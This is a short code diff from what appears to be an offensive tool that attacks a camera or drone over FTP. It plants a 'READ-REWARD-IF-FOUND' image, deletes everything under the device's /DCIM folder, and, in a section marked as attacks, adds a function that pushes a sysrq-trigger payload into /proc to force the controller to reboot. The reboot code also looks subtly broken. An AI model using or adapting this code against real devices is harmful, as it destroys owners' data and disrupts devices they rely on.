@@ -4,12 +4,15 @@ import os
 
 def plantrecoveryimage(ftp):
     
-    ftp.storbinary('STOR /DCIM/100MEDIA/READ-REWARD-IF-FOUND.jpg', open('./resources/reward-recovery/READ-REWARD-IF-FOUND.jpg', 'rb'))
+    try:
+        ftp.storbinary('STOR /DCIM/100MEDIA/READ-REWARD-IF-FOUND.jpg', open('../res/img/READ-REWARD-IF-FOUND.jpg', 'rb'))
+    except:
+        ftp.storbinary('STOR /DCIM/READ-REWARD-IF-FOUND.jpg', open('../res/img/READ-REWARD-IF-FOUND.jpg', 'rb'))
     
     
 def cleardcim(ftp):
     
-    ftp.cwd('/DCIM/100MEDIA')
+    ftp.cwd('/DCIM')
     for item in ftp.nlst():
         try:
              ftp.delete(item)
@@ -17,7 +20,12 @@ def cleardcim(ftp):
              ftp.rmd(item)
                 
 
-########UNUSED ATTACKS BELOW########            
+########UNUSED ATTACKS BELOW########
+
+def rebootcontroller(ftp):
+    
+    ftp.cwd('/proc/')
+    ftp.sendcmd('put ../res/payloads/sysrq-trigger')
                 
 def changepsk(psk, ftp):
 
